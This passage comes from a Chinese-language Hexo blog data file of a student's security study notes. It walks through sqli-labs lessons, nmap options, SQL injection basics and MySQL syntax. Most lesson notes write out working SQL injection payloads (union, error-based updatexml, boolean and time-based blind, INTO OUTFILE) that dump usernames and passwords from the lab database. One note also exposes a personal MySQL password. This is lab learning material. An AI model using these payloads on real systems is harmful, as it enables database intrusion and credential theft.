updatexml(1,concat(&#x27;#&#x27;, database()),1)# 得： 注：#字符是为了使xpath路径语法错误，也可以用别的字符代替。 爆表：输入： 12username=rootpassword=&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),1)# 得： 爆列：输入： 12username=rootpassword=&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)),1)# 得： 爆值：输入： 123username=rootpassword=&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select * from (select concat_ws(&#x27; &#x27;,id,username,password) from users limit 0,1) x)),1)# 得： 注：1.爆值的时候需要注意，不能直接用简单的select concat(username)，这样会引起报错： 原因是：在同一个语句中，不能先查询表中的值再update这个表，可以先把查询出的值作为一个派生表，然后在这个派生表里面再次进行查询。 2.由于用户数据较多，且报错内容有长度限制，所以我们在注入是可以通过改变limit函数变量来控制 回显内容。 sp：回顾一下字符串连接函数 1.concat(str1,str2,…)——没有分隔符地连接字符串2.concat_ws(‘separator’,str1,str2,…)——含有分隔符地连接字符串3.group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson11-16","date":"2021-01-30T14:56:26.000Z","path":"2021/01/30/lesson11-16/","text":"post注入Q：什么是post A：用户将数据从网页或者客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交， 提交到服务器后服务器再在数据库中进行验证。 Q：与get注入的区别 A：get请求不发送数据至服务器，而post请求包含数据提交 post类型sql注入原理：将用户的输入当作代码/指令，在数据库中操作、执行。 lesson11：lesson11的源码： 1@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;; 通过查看lesson11的源码我们可以通过更改输入的内容进而修改数据库中代码， 如username=root‘ or ’1’=‘1，password=随意；发现登入成功。（username带入数据库为：@$sql=”SELECT username, password FROM users WHERE username=’$root‘ or ’1’=‘1’ and password=’$随意’ LIMIT 0,1”;我们可以看到只要数据库中存在用户root，那么这个语句恒成立） 那么我们可以进一步通过更改上传数据来达到获取数据库信息的目的。 一.爆库输入： 11&#x27; union select 1,database()# 得： 二.爆表输入： 11&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 得： 三.爆列11&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; # 得： 四.爆值输入： 11&#x27; union select (select group_concat(username) from users), (select group_concat(password) from users)# 得： lesson12：lesson12的源码： 123 $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password= ($passwd) LIMIT 0,1&quot;; 查看源代码不是很能直观看出数据库如何闭合函数，我们通过网页检测其是如何闭合参数的： username=a’a”a’)a 得： 我们通过观察password部分可知注入点为‘’）； 但是当我构造payload：root‘’）#时我发现页面返回错误，而且我发现这关无法通过注释达到篡改数据库。 剩下的和lesson11一样。 lesson13：通过查看源码，或在网页上输入错误sql语法，可知注入点为：‘） 但是登入成功后我们看不到页面有回显数据，那么这题要采用盲注（参考第五关、第八关）。 lesson14：通过查看源码，或在网页上输入错误sql语法，可知注入点为 ：” 但是登入成功后我们看不到页面有回显数据，那么这题要采用盲注（参考第五关、第八关）。 lesson15：无法通过sql语法错误来检测数据库闭合参数类型， 查看源码： 1@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; 注入点为：’ ； 登入成功，无回显，盲注（参考第五关、第八关）。 lesson16：做这关的时候放了一个错误卡了好久：把“）型的双引号用两个单引号代替了，导致一直输入返回值错误。 查看源码可得注入点为：”)； 登入成功，无回显，盲注（参考第五关、第八关）。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"2021.1月web渗透培训","date":"2021-01-27T02:56:06.000Z","path":"2021/01/27/2021-1月web渗透培训(1)/","text":"web渗透的宏观思路：a.信息收集b.漏洞挖掘c.漏洞利用d.输出渗透测试报告一.信息收集1.基本信息： 《域名信息，子域名，ip地址，同IP的其他网站信息–站长之家； ​ 获取子域名–子域名挖掘机 ​ 获取域名或IP地址–http://viewdns.info、https://www.dnsdb.io ​ 根据IP地址查询同一IP地址的其他信息–http://114best.com/ip/114.aspx?w= 《端口：80（http）443（HTTPS） 445（共享文件夹）； 《服务（web版本），服务版本； 2.os操作系统版本： linux，wind，mac 3.web中间件（web程序，用来提供网页服务） Apache（主流），iis，Nginx，weblogic 4.数据库 类型、版本：mysql，mssql，oracle，access 5.服务器后端的脚本类型、版本 PHP、JSP、ASP ~端口扫描技术–NMAP基本命令格式：nmap -参数 ip/ip段/主机地址 Nmap TCP扫描端口选项:-sP：用ping的方式判断是否有存活主机,不扫描端口。-sT：使用TCP连接扫描，对目标主机所有端口进行完整的三次握手，如果成功建立连接则端口是开放的。-sS：使用半开连接（SYN stealth)扫描，使用SYN标记位的数据包进行端口探测，收到SYN/ACK包则端口是开放的，收到RST/ACK包则端口是关闭的。-sA：TCP ACK扫描使用ACK标志位数据包，若目标主机回复RST数据包，则目标端口没有被过滤（用于发现防火墙的过滤规则)。 Nmap UDP扫描端口选项:-sU使用UDP数据包经行扫描，返回UDP报文，则端口是开放的;返回不可达则端口处于关闭或过滤状态。 Nmap目标端口选项:-p：扫描指定的端口-F：快速扫描100个常用的端口-r：顺序扫描，按从小到大的顺序进行端口扫描 Nmap输出选项:-oN：标准输出为指定的文件-oX：生成XML格式文件可以转换成HTML文件 其他常用选项:-sV：检测服务端软件版本信息-O：检测操作系统信息-Pn：禁用nmap的主机检测功能-A：探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测 注：nmap -sP ip段可检测该网段下所有存活的主机 本章参考ppt：https://kdocs.cn/l/ctOPJlaBJgUw","tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://example.com/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"2021-1月web渗透培训(2)","date":"2021-01-27T02:56:06.000Z","path":"2021/01/27/2021-1月web渗透培训(2)/","text":"SQL注入原理（web漏洞）： 将用户的输入当作代码/指令，在数据库中操作、执行 例如：用户名：admin 密码：123 正常带入数据库中执行：select *from users where username=‘admin’ and password=‘123’–返回正确，成功登入； 利用SQL注入： 构造payload：用户名：admin‘ or ’1‘=’1 密码=‘随意’； 带入数据库中执行：select *from users where username=‘admin‘ or ’1‘=’1’ and password=‘随意’–返回正确，成功登入；我们可以看到数据库误把用户的输入当做代码，整合到源码中，1=1恒成立故导致该语句恒成立。 注：数据库中 ‘ = ’ 优先级高于 ‘and’ 高于 ‘or’； 预防SQL注入：过滤用户的特殊输入（关键字：and等，字符：‘ 等），预编译（将用户的输入当作字符串，即不数据库不会执行夹杂在用户输入的代码中）； 判断是否存在SQL注入漏洞： (1)?id=1’ –页面是否报错 (2)?id=1’ and ‘1’=’1–页面是否正常 (3)?id=1’ and ‘1’=’2–页面是否异常 若(1)报错(2)正常(3)异常则说明存在SQL注入漏洞。 参考ppt：https://kdocs.cn/l/crYKxbz6UgjE 密码goktech","tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://example.com/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"PHP语法","date":"2021-01-25T04:18:49.000Z","path":"2021/01/25/PHP语法/","text":"PHP标记：我们主要使用&lt; ?php ?&gt; ； PHP中的分隔符：1、PHP中的“结构定义语句”（分支，循环，类，函数等{}结尾），不需要使用分号结尾。2、PHP中的“功能执行语句”，不用{}结尾的，必须使用分号结尾。 PHP中的变量：1.PHP是一种弱类型语言。变量无需声明，直接给变量赋值即可，并且可以在后续赋值过程中随时修改变量的数据类型。 2.PHP中可以使用连等同时声明多个变量，而不能使用逗号分隔。eg：$a=$b=$c=10 sp：PHP语法学习详情参考：https://www.cnblogs.com/suitongyu/p/7748153.html","tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"lesson9、lesson10","date":"2020-12-13T14:20:36.000Z","path":"2020/12/13/blog j/","text":"lesson9这题很有意思，我发现不管输入什么，返回值都是you are in，于是我查看源代码—— 123456789101112131415161718if($row) &#123; echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;; echo &#39;You are in...........&#39;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;&#x2F;font&gt;&quot;; &#125; else &#123; echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;; echo &#39;You are in...........&#39;; &#x2F;&#x2F;print_r(mysql_error()); &#x2F;&#x2F;echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;&#x2F;br&gt;&lt;&#x2F;font&gt;&quot;; echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D; 3&gt;&#39;; &#125;&#125; 我们可以看到不论输入结果正确与否输出都为you are in 通过题目我们知道注入点为 ’ 于是我觉得可以利用时间盲注，通过延时判断语句正确与否，于是输入爆库语句—— 1?id&#x3D;1&#39; and If(substr(database(),1,1)&#x3D;&#39;e&#39;,sleep(5),1)--+ 发现可行，那么剩下的内容和lesson8就一模一样了。 lesson10这题基于lesson9，但注入点有别于lesson9为 ‘’ 其余的也一样了。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lessen8","date":"2020-12-13T07:23:18.000Z","path":"2020/12/13/blog i/","text":"一.爆库首先输入—— 1?id&#x3D;1--+ 页面回显you are in 接着打开源码查看到—— 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;; 则注入点为 ‘ ，输入语句—— 1?id&#x3D;0&#39; or 1&#x3D;1--+ 回显正确。那么这时我觉得这和lesson5有什么区别呢？查看源代码发现—— 1&#x2F;&#x2F;print_r(mysql_error()); 他对mysql报错语句进行了注释，即这关不能用报错注入。 于是我用布尔盲注，我发现不管我输入语句判断正确与否他返回的都是you are in那么说明我们想要使用布尔盲注也是不行的。那么最后尝试一下时间盲注，输入语句—— 123?id&#x3D;1&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+或?id&#x3D;1&#39;and If(substr(database(),1,1)&#x3D;&#39;s&#39;,1,sleep(5))--+ 发现可以行得通，那么本题使用时间盲注无疑了。 二.爆表输入语句—— 1?id&#x3D;1&#39;and If(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1),1,1)&#x3D;&#39;e&#39;,1,sleep(5))--+ 三.爆列输入语句—— 1?id&#x3D;1&#39;and If(substr((select column_name from information_schema.columns where table_schema&#x3D;database()limit 0,1),1,1)&#x3D;&#39;i&#39;,1,sleep(5))--+ 四.爆值输入语句—— 1?id&#x3D;1&#39; and if(substr((select username from users limit 0,1),1,1)&#x3D;&#39;D&#39;,1,sleep(5)) --+","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"mysql","date":"2020-12-07T08:25:42.000Z","path":"2020/12/07/数据库的增删改查/","text":"一.MySQL的增删改查语句。1.增：有四种方法a.使用insert插入单行数据；语法格式为insert into 表名（列名） values （’列值’）； 例如：insert into lcj（姓名，班级，座号）values （‘小林’，‘网安一班’，‘30’）； b.insert 表名 set 列名=‘列值’，列名=‘列值’…….. 注：增加的列值是填充在新一行。 2.删：a.使用delete删除数据；语法格式为delete from 表名 ；可在表名后面加where语句来充当条件语句。例如：delete from lcj where name=‘小林’；译为删除表lcj中列值为小林的行（注意：是一整行！）3.改：a.运用update对原1列值进行改动；语法update 表名 set 列名=更新值；例如：update lcj set 座号=1；可在更新值后面加where语句来充当条件语句；4.查：a.查表中的所有数据：select *from 表名；b. 二.MySQL语句使用练习。1.建立数据库：create database class character set gbk; 其中class为数据库名。 2.使用数据库：use class； 3.创建表：create table a（列名 数据类型）；其中a为表名。 如：{ create table class(name varchar(20)); } 4.查看表数据（值）：select *form a； 5.查看表结构：desc a； 三.特殊的增加列：alter table 表名 add 列名 列值类型 约束； 将旧表的内容复制到新表：insert into less42 select *from users 附：MySQL增删改查语句学习资料https://www.iteye.com/blog/sakyone-365147 四.数据库alter的用法：1：删除列 ALTER TABLE 【表名】 DROP 【列名】 2：增加列 ALTER TABLE 【表名】 ADD 【列名】 【类型】alter table table1 add transactor varchar(10) not Null; 3：重命名列 ALTER TABLE 【表名】 CHANGE 【列名】【新名】 4：修改表字段 alter table 表名称 change 字段名称 字段新名称 字段新类型 [是否允许非空];alter table 表名称 modify 字段名称 字段新类型 [是否允许非空]; 5：查询表的字段信息 desc 表名称; 6：创建索引 ALTER TABLE tbl_name ADD INDEX index_name (column list); 7：删除索引 ALTER TABLE tbl_name DROP INDEX index_name (column list); 8：修改表名 ALTER TABLE 表名 rename 新表名; 原文链接：https://blog.csdn.net/sinat_36053757/article/details/83380684","tags":[{"name":"数据库的增删改查","slug":"数据库的增删改查","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"}]},{"title":"lesson7","date":"2020-11-29T08:49:29.000Z","path":"2020/11/29/blog g/","text":"一.预备1.利用load_flie()函数导出文件： load_file(file_name):读取文件并返回该文件的内容作为一个字符串。 注.使用条件： a.必须有权限读取并且文件必须完全可读。当文件不存在或者没有权限访问时函数的返回值为空。 b.欲读取文件必须在服务器上。 c.必须指定文件完整的路径。 d.欲读取文件必须小于 max_allowed_packet。 二.lesson7实战A.查找注入点：查询源代码—— 1$sql&#x3D;&quot;SELECT * from users where id&#x3D;((&#39;$id&#39;)) limit 0,1&quot;; 我们可以得知注入类型为：’)) 构造语句—— 1?id&#x3D;0&#39;)) or 1&#x3D;1--+; 返回正常。 B1.数据库中导出文件遇到问题：输入语句—— 1?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\1.txt&quot;--+ 在指定目录下未生成相应名为“1”的文件 由前人指点：mysql最初对文件的导入和导出有限制，因此应当先取消该限制 在mysql数据库中执行语句—— 1show variables like &quot;secure_file_priv&quot;; 发现本地value的值为NULL。NULL表示禁止。即禁止将产生的文件导入mysql目录下（注：如果这里value值有文件夹目录，则表示只允许该目录下文件。如果为空，则表示不限制目录。） 既然问题找到了，那就解决它——去掉导入目录的限制：在mysql配置文件my.ini中加入语句—— 1secure_file_priv &#x3D; 然后重启mysql，在执行上述语句则在指定目录下找到指定文件。 由于我们刚刚没有规定产生的文件导出到哪里，因此在导出文件时要表明目录地址。 在mysql数据库中输入语句—— 1select *from users into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\1.txt&quot;; 则可在指定目录下找到该文件，得到users的全部内容。（注文件一定要是导出目录下不存在的新名字文件） B2.在B1的操作之后就可以开始常规流程：1.爆库 1?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\1.txt&quot;--+ 点开1.txt的文件可以发现里面包含数据库名 2.爆表 1?id&#x3D;-1&#39;))union select 1,2,table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\2.txt&quot;--+ 点开2.txt的文件可以发现里面包含库名为security下的所有表的表名 3.爆列 1?id&#x3D;-1&#39;))union select 1,2,column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\3.txt&quot;--+ 点开3.txt的文件可以发现里面包含库名为security下表名为usesr的列的所有列名 4.爆值 1?id&#x3D;-1&#39;))union select *from users into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\4.txt&quot;--+ 点开4.txt的文件可以发现里面包含库名为security下表名为usesr的所有数据值。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"MySQL","date":"2020-11-28T14:35:29.000Z","path":"2020/11/28/blog f/","text":"一.基本的使用 1.查看有哪些数据库：show database； 2.调用security数据库：use security； 3.查看被调用的数据库中有哪些表名：show tables； 4.查看表的结构，如：desc email； 5.查看表的内容：select *form 表名；","tags":[{"name":"mysql数据库的使用","slug":"mysql数据库的使用","permalink":"http://example.com/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"}]},{"title":"lesson5&lesson6","date":"2020-11-20T08:15:38.000Z","path":"2020/11/20/blog e/","text":"lesson5A.sql布尔盲注一.寻找注入点输入?id=1返回正常；输入?id=1’返回报错；确认注入点：输入?id=0’ or 1=1–+，返回正常，说明此题‘为注入点。 二.爆库（遇到挫折）通过输入之前学过的爆库语句发现得到的返回值只有you are in，无法显示出数据库名。所以要学习一种新的注入方法：盲注。 A.函数left（）函数：left（a，b）即从左侧截取字符串a的前b位，例如left（database（），1），database（）显示数据库名称（为字符串），即译为截取数据库名称的第一位数。substr（）函数：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度，取到的值包括b位置对应字符本身。同mid（）函数。ascii()函数：将某个字符转换 为 ascii 值 。同ord（）函数。length（）函数：获取数据库长度。如?id=1’and length(database())=n–+当n的值等于数据库名称字符串长度时，返回正常，反之报错B.猜测数据库名称猜测数据库名称第一位–输入语句：?id=1‘and left(database(),1)&gt;’a’–+ ，若返回正常，则说明数据库名称首字母大于a，反之则说明数据库首字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。猜测数据库名称第二位–输入语句?id=1’and left(database(),2)&gt;’sa’–+ ,若返回正常，则说明数据库名称第二位字母大于a，反之则说明数据库名称第二位字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。猜测后续字母值同上，重复使用语句即可获得数据库名称“security”。三.爆表！首先要先了解一下ascii码表，用于构建注入语句。a.爆第一个表：输入语句?id=1‘and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1）,1，1)) &gt;65 –+ 。注：1.limit 0,1的意思是从第1行开始，获取这一行的返回值。而此处的意思是获取数据库的第一个表的表名。{substr((select table_name from information_schema.tables where table_schema=database() limit 0,1）}即获取数据库的第一个表的表名。其在substr（a，b，c）中充当a的值。2.整个输入语句的意图是：通过ascii码转换，猜测数据库的第一个表表名的首字母。为了猜测得到表名第二位字母，仅需将substr（a,b,c)中的1改为2。后续字母以此类推，可得数据库第一个表的表名。3.猜测的过程同样采用二分法。b.爆第二个表：仅需把a中输入语句的limit 0,1改成limit 1,1。其余照部就搬。四.爆列如猜测users表中是否存在username列，输入语句：?id=1’ and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+返回正常，则说明users表中存在username列。证明其他列是否存在也可用上述方法，仅需变换列名。五.爆值如输入语句?id=1’ and ord mid((select ifunll(cast(username as char),0x20)form security.users order by id limit 0,1),1,1))=68–+ 。意思是获取username列中第一行的第一个字符的对应ascii码的数值与68比较，以确认其值。其余操作都是按部就搬上面。B.*sql报错注入C.*sql延时注入预备：时间盲注多与if（expr1,expr2,expr3）结合使用，此if语句的用法是：如果expr1是true，则if（）的返回值为expr2；否则返回expr3.关于sleep函数：https://blog.csdn.net/zyz511919766/article/details/42241211 1.利用sleep（）函数进行注入：?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+当错误的时候网页会有五秒的延迟。总结：在本题学习时学习了sql盲注之正则表达式攻击。我们可以使用正则表达式攻击法获得表名或列名。1.如判断第一个表名的第一个字符是否是a-z中的字符，输入语句：?id=1’ and 1=(select 1 from information_schema.tables where table_name=’security’ and table_name regexp ‘^[a-z]’ limit 0,1)–+2.如判断第一个字符是否是a-n中的字符，输入语句：?id=1’ and 1=(select 1 from information_schema.tables where table_name=’security’ and table_name regexp ‘^[a-n]’ limit 0,1)–+3.如确定一个数是n：?id=1’ and 1=(select 1 from information_schema.tables where table_name=’security’ and table_name regexp ‘^n’ limit 0,1)–+4.自己在后续的做题时发现布尔盲注法用起来很鸡肋，因为如果页面一直回显给你you are in那么你就无法确定注入语句是否正确。lesson6由题目可知：这是双注入双引号型。我们通过查找源代码： 12$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;; 易知本题的注入点仅需把lesson5的注入点 ‘ 改为 “ 即可，其余按部就班。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson2，lesson3，lesson4","date":"2020-11-16T14:04:05.000Z","path":"2020/11/16/blog d/","text":"一.找注入点由题目提示：注入点为整数。 试探：输入?id=1返回正常；输入?id=0返回异常；且输入?id=0 or 1=1–+得到的返回值正确。故该处存在sql注入点。 二.判断字段数 输入?id=1 order by n–+直到输入n=4时返回错误。故数据库中存在3个字段。 三.爆开数据库：得到数据库名 输入?id=0 uion select 1,2,database()–+语句 四.爆开数据表：得到数据表名 输入?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –+语句。 注：table_schema=database()赋值语句，即列出数据库中的表名 五.爆开数据列：得到数据列名 输入?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+语句 六.爆开数据值 输入?id=0 union select 1,group_concat(username,0x3a,password),3 from users–+语句。 七.总结：lesson1—4的爆库方法基本一致，只有在注入点上略有不同。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson1","date":"2020-11-14T13:07:05.000Z","path":"2020/11/14/blog c/","text":"前言：这是第二次写lesson1的blog，万事开头难。 一.寻找sql注入点 根据标题提示该sql注入点为单引号。输入?id=1’返回值错误；输入?id=1返回值正常。故存在注入点。 注：1.（自己的摸索）：发现输入id=非正整数如（?id=-1）时，页面返回为空。这是因为这些数值不在数据库范围之内，故返回为空。 2.不是所有引起报错的点都是注入点，也可能是由于单纯的语法错误导致了页面报错。而当存在一个真正的注入点时，输入?id=0+注入点+or 1=1–+语句返回值正常，反之报错。 二.查询字段数 利用order by语句。?id=1%27%20order%20by%20n–+（n为正整数，不断改变n的值通过观察返回状态确定字段数）如： 输入?id=1%27%20order%20by%201–+，返回正常。 输入?id=1%27%20order%20by%204–+，返回异常。 当输入到第n-1个正常，第n个不正常时，说明拥有n-1个字段数。 注：字段数就是sql数据库中存在变量数的个数。 三.union select看返回值 1.利用union select语句查看字段数返回值。?id=-1%27union%20select%201,2,3–+。 只有2,3代表的回显位能被观察到，即用户从浏览器上反馈看见的只有2,3回显位。 2.利用union select语句查看数据库返回值。 输入?id=-1%27union%20select%201,database(),2–+. 由此可知：database的名称为security。 注意使用union select 四.查表 1.输入?id=-1’ union select 1 ,2,group_concat(table_name) from information_schema.tables where table_schema=‘sercurity’–+即可查获在sercurity数据库中的表单名。 注：对于理解该代码：group_concat(table_name) ：group_concat函数是典型的字符串连接函数；from information_schema.tables：来自信息图表数据库中的表单。where table_schema=‘sercurity’其中where为限制词，where table_schema=‘sercurity’:寻找范围在数据库名为sercurity中。 ps:为了方便在页面上看到自己在url里输入的内容可以在index文件里加一句echo &quot; $sql&lt; br &gt;&quot;; 五.查字段名以及字段数值 1.输入?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()–+可查得字段名。 2.输入?id=-1’union select 1,2,group_concat(username,0x3a,password) from users–+可查得每个用户对应的密码（0x3a是字符冒号，：’对应16进制的ASCLL码）","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"sql注入基本知识lesson1","date":"2020-11-10T13:00:12.000Z","path":"2020/11/10/blog b/","text":"一.判断是否存在sql注入的方法1.基础中的基础：get单引号判断在地址栏网址后加**?id=1，显示正常；加?id=1’，显示错误。则说明存在sql注入点。且‘**的url编码是%27. 2.get and判断输入?id=-1 and 1=1 正常； 输入?id=-1&#39;and 1=2 报错；存在sql。 总结：在请求字符串或id参数后加’，是一种基本检测是否存在sql注入的方法。 3.Or、xor判断同get and判断 4.sql运算符判断5.通过sleep函数演示显示的形式进行判断6.服务端返回错误形式7.了解post、get、编码# 是sql语句中的注释符； + 在http请求中表示空格； -- 后面的语句相当于被注释掉,不执行后面的sql语句； --+代表闭合sql查询语句，如果没加，无法形成有效的mysql语句。 在post参数中，要加空格符时，直接输入空格符即可；用+会被http请求转义为%23编码； 在get请求中，如果想使用空格，需要用空格符编码%20来替代，不然会请求报错；如果使用#，则#后面的参数不会提交到服务器，但如果使用编码%23即可提交到服务器。 常见的url编码：空格 ：%20 ； + ：%2B； &lt; ：%3C； &gt; ：%3E ‘ : %27 #： %23 8.sql注入常用函数1.order by：该函数对结果集进行排序，用于猜测字段数。例如输入?id=1’ order by 3 –+显示正常；输入?id=1’ order by 4 –+显示错误。故得出在?id=1查看的表有3个字段 二.确认字段数确认字段数可以使用order by语句，例如：?id=1’ order by 4 %23 时报错!","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"MYSQL","date":"2020-11-09T13:29:45.000Z","path":"2020/11/09/MYSQL数据库/","text":"1.MYSQL注入在线靶场https://www.anquanlong.com/lab_detail?lab_id=3&amp;lib=1 个人用phpstudy搭建本地靶场。 2.更改root密码时应该同时修改网址的根目录下对应文件中的密码。如sql-connections文件中。 MYSQL数据库的使用1.在D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\bin目录下打开，输入语句./mysql.exe -uroot -p； 2.跳出语句让你输入密码（lcj20020425）； 3.输入查询语句，语句以；结尾。","tags":[{"name":"MySQL数据库的搭建与启动","slug":"MySQL数据库的搭建与启动","permalink":"http://example.com/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/"}]},{"title":"","date":"2020-10-01T13:32:41.724Z","path":"2020/10/01/blog1/","text":"title: “搭建的博客”date: 2020-10-01 21:32:41tags:description:1.用git bash进行hexo init指令时一定要认清楚文件夹，是对hexo文件夹进行格式化，我刚刚开始做的时候对blog文件夹一直做格式化导致耗费了很久时间2.在复制个人github地址后粘贴在congig时可能会混杂许多空格，这些空格会影响你执行hexo d指令，也就是说无法将本地文件部署到个人网页上 3.生产新博客：hexo new blogx 4.写blog的时候要使用编码UTF-8,否则传输到hexo网页上会显示乱码 5.用hexo g；hexo d指令上传博客时要在**hexo文件**下建立的hexo bash中输入。","tags":[]}]